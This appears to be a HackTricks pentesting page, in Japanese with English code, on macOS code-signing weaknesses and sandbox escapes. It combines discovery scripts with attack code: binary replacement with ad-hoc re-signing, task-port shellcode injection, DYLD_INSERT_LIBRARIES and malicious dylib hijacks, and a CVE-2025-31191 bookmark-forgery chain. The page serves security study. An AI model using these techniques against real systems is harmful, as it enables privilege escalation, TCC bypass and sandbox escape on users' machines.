# macOS Code Signing の弱点と Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### 基本情報

**Ad-hoc signing** (`CS_ADHOC`) は、**certificate chain** を持たない code signature を作成します。署名された code の hash は引き続き計算されるため、validation によって変更を検出できますが、他の component が認証できる developer identity は提供しません。executable を置き換えて再署名すると、異なる CodeDirectory/CDHash が生成されます。<sup>[[1]](#references)[[4]](#references)</sup>

Apple Silicon Mac では、すべての executable に最低限 ad-hoc signature が必要です。そのため、多くの development tool、Homebrew package、third-party utility に ad-hoc signature が見つかります。

### 重要な理由

- **検証可能な signer identity がない** — path、ad-hoc status、または pinning されていない identifier のみを受け入れる check では、binary の作成者を特定できません。
- **privileged position**（FDA、daemon、helper）にある third-party ad-hoc binary は、その file または親 directory が writable である場合、優先度の高い target です。
- CDHash、designated-requirement、または requirement-backed TCC check は置き換えを検知します。path-based policy では検知できない場合があるため、再署名後も grant が維持されると仮定せず、実際の requirement を調査して grant を再テストしてください。

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### 攻撃: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## デバッグ可能なプロセス（get-task-allow）

### 基本情報

**`com.apple.security.get-task-allow`** entitlement（または `CS_GET_TASK_ALLOW` flag）は、Hardened Runtime によって通常は阻止される場合でも、認証済みの debugger がプロセスの task port を取得できるようにします。debugger による取得に成功すると、メモリの読み取り、レジスタの変更、code の inject、実行の制御が可能になります。<sup>[[3]](#references)</sup>

これは**開発用 build のみ**を対象としています。しかし、一部の third-party binary は production 環境でもこの entitlement を付けたまま出荷されています。

> [!CAUTION]
> `get-task-allow` を持つ production binary は、強力な exploitation primitive です。`taskgated`、caller identity、sandboxing、debugger entitlements、Developer Tools authorization は、特定の client が task port を取得できるかどうかに依然として影響します。`lldb`/`debugserver` と、使用する injector の両方でテストしてください。attachment に成功すると、inject された code は target の entitlements、TCC grants、security context を使用して実行されます。

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### 攻撃: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Library Validation なし + DYLD Environment

### Runtime での Library-Validation 解除

private entitlement **`com.apple.private.security.clear-library-validation`** は、process launch 時に library validation を無効化するものではありません。代わりに、process が runtime で自身に対して `csops(..., CS_OPS_CLEAR_LV, ...)` を呼び出すことを許可します。XNU は、caller が entitlement を持ち、handler の追加チェックを満たしている場合に、`CS_REQUIRE_LV | CS_FORCED_LV` をクリアします。その結果、process は library validation をクリアする code path に到達した後にのみ、library-injection target として実用的な対象になる可能性があります。<sup>[[4]](#references)[[5]](#references)</sup>

### 危険な組み合わせ

binary が**両方**を持つ場合:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (任意の dylib をロード)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars を受け入れる)

これは価値の高い code-injection の組み合わせです。Hardened Runtime により、信頼されていない library と DYLD environment variable の両方が許可されるためです。ただし、launch context によっては DYLD variables が scrub されることがあります（protected または privileged execution path など）。そのため、この entitlement の組み合わせを無条件とみなすのではなく、正確な invocation を確認してください。

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### 攻撃: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Temporary Exceptions

### How They Weaken the Sandbox

Sandbox の一時的な例外（`com.apple.security.temporary-exception.*`）は、App Sandbox に抜け穴を開けます:<sup>[[2]](#references)</sup>

| Exception | What It Allows |
|---|---|
| `temporary-exception.mach-lookup.global-name` | システム全体の XPC/Mach サービスへの接続 |
| `temporary-exception.files.absolute-path.read-write` | app container 外のファイルの読み書き |
| `temporary-exception.iokit-user-client-class` | IOKit user-client 接続のオープン |
| `temporary-exception.shared-preference.read-only` | 他の app の preferences の読み取り |
| `temporary-exception.files.home-relative-path.read-write` | `~` を基準としたパスへのアクセス |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

最も危険な例外は **mach-lookup** です。これにより、sandbox 内の app が privileged daemon と通信できます:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 攻撃: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Code-Signing Checks は XPC Client Integrity ではない

XPC service は、audit token から code-signing state を抽出し、Apple の **platform binary** または `CS_REQUIRE_LV`/`CS_FORCED_LV` を持つ client を受け入れることで connection を認証する場合があります。これらのテストで確認できるのは executable と一部の process flags であり、現在の address space に trusted code だけが含まれていることの証明にはなりません。ImageCapture services に対する research では、`/bin/ls` のような injectable な Apple binary が `DYLD_INSERT_LIBRARIES` を通じて attacker の dylib を load し、その後 platform client として接続できることが示されました。続いて行われた library-validation flags のチェックも bypass され、Apple が macOS 15 で service に private authorization entitlement を要求するよう変更するに至りました。<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. `listener:shouldAcceptNewConnection:`（または同等の low-level XPC handler）を reverse し、`isPlatformBinary`、`kSecCodeInfoFlags`、`CS_PLATFORM_BINARY`、`CS_REQUIRE_LV`、`CS_FORCED_LV` のみに基づく判断を特定します。
2. protocol を話せる Apple-signed client を列挙し、Hardened Runtime と entitlements を確認します。platform signature だけでは DYLD injection が block されている証拠にはなりません。
3. candidate を **target macOS build** 上でテストします。constructor dylib が load される場合は、その constructor から service connection を作成し、audit token が受け入れられる platform process に属するようにします。
4. vendor patch ごとに再テストします。同じ authorization decision に別の mutable process-status flag を追加しても、confused-deputy primitive が除去されるとは限りません。
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> DYLD の動作、AMFI ポリシー、サービス側のチェックは macOS のリリースごとに変化します。完全にパッチ適用済みのホストに対する失敗だけでは、脆弱なリリースで同じ chain が失敗したことの証明にはなりません。

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks は、ユーザーが選択したファイルをアプリの起動後も保持します。sandbox extension は boot-bound であるため、`ScopedBookmarkAgent` はそれを検証し、長期間有効な HMAC-authenticated bookmark を作成します。後でアプリがその bookmark を提示すると、agent はそれを検証して、新しい sandbox extension を発行します。署名 secret は login keychain に保存され、bundle identifier を使用してアプリごとの key が導出されます。<sup>[[7]](#references)</sup>

影響を受けるシステムでは、keychain ACL により、信頼されていない process が `com.apple.scopedbookmarksagent.xpc` secret を**読み取る**ことは防止されていましたが、削除は防止されていませんでした。侵害された sandboxed app は、item を既知の secret と attacker-controlled ACL に置き換え、アプリ固有の HMAC key を導出し、書き込み可能な container bookmark plist 内のエントリを forge して、`ScopedBookmarkAgent` にそれらを file-access extension と交換させることができました。これにより、security-scoped bookmarks を使用するあらゆる sandboxed application が、追加の file-picker interaction なしに arbitrary-file-access sandbox escape の潜在的な対象となりました。Apple は 2025 年 3 月 31 日の security updates でこの issue を修正しました。<sup>[[7]](#references)</sup>

### Triage and Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
脆弱なホストでの exploitation sequence は次のとおりです。

1. persistent scoped bookmarks を使用する sandboxed app 内で code execution を取得する。
2. agent の keychain signing item を、既知の secret と permissive ACL に置き換える。
3. `HMAC-SHA256(key=known_secret, data=bundle_id)` を計算し、app の writable bookmark store にある有用な path 用の bookmark を偽造する。
4. アプリケーションの通常の bookmark-resolution path をトリガーし、`ScopedBookmarkAgent` に sandbox extension を返させる。
5. 新たな file access を使用して、その user が利用できる sandbox 外の execution または data target を上書きする。

これは**patched-version technique**です。trust boundary を理解し、unpatched systems を評価するために使用してください。current releases に対する前提として扱わないでください。Current testing では、bookmark parsing、identity binding、keychain-item lifecycle、および agent 周辺の confused-deputy behavior に重点を置いてください。

---

## Private Apple Entitlements

### 概要

`com.apple.private.*` を prefix とする entitlements は、third-party developers 向けにドキュメント化または提供されていない **Apple-internal APIs** への access を提供します。Private entitlements を持つ third-party binaries は、enterprise cert、MDM、または non-App-Store distribution を通じて取得されました。

### 危険な Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | TCC database の完全な read/write |
| `com.apple.private.tcc.allow` | 特定の TCC services への access |
| `com.apple.private.security.no-sandbox` | sandbox なしで実行 |
| `com.apple.private.iokit` | IOKit driver への直接 access |
| `com.apple.private.kernel.\*` | Kernel interface への access |
| `com.apple.private.xpc.launchd.job-label` | launchd jobs の登録・管理 |
| `com.apple.rootless.install` | SIP-protected paths への write |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### 概要

Binaries は、SBPL (Seatbelt Profile Language) で記述された **custom sandbox profiles** を同梱できます。これらの profiles は、デフォルトの App Sandbox よりも制限が厳しい場合もあれば、**より permissive** な場合もあります。

### Custom Profiles の監査
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 書き込み可能なライブラリパス

### 概要

バイナリが、現在のユーザーが**書き込み可能な**パスから動的ライブラリを読み込む場合、そのライブラリを悪意のあるコードに置き換えられる可能性があります。

### 発見
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### 攻撃: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — コード署名ガイド](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h`（`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c`（`csops` / `CS_OPS_CLEAR_LV` handler）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [macOS Sandbox Escapesの新時代：見過ごされていた攻撃対象領域を掘り下げ、10件以上の新たな脆弱性を発見](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [CVE-2025-31191の分析：macOSのsecurity-scoped bookmarksを利用したsandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
